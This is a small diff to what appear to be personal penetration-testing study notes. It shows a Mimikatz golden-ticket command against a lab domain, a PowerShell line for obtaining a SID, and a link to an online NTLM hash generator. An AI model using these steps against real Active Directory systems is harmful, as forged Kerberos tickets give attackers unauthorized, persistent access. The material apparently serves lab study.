@@ -402,8 +402,8 @@ kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-27875233
 kerberos::list
 ```
 ```
-Get Domain user's sid:
-Get-LocalUser -Name 'svc_mssql' | select name,sid
+Get Domain's sid:
+Get-LocalUser -Name 'svc_mssql' | select name,sid(result without the last 3digits)
 
 String Convert to NTLM hash:
 https://codebeautify.org/ntlm-hash-generator
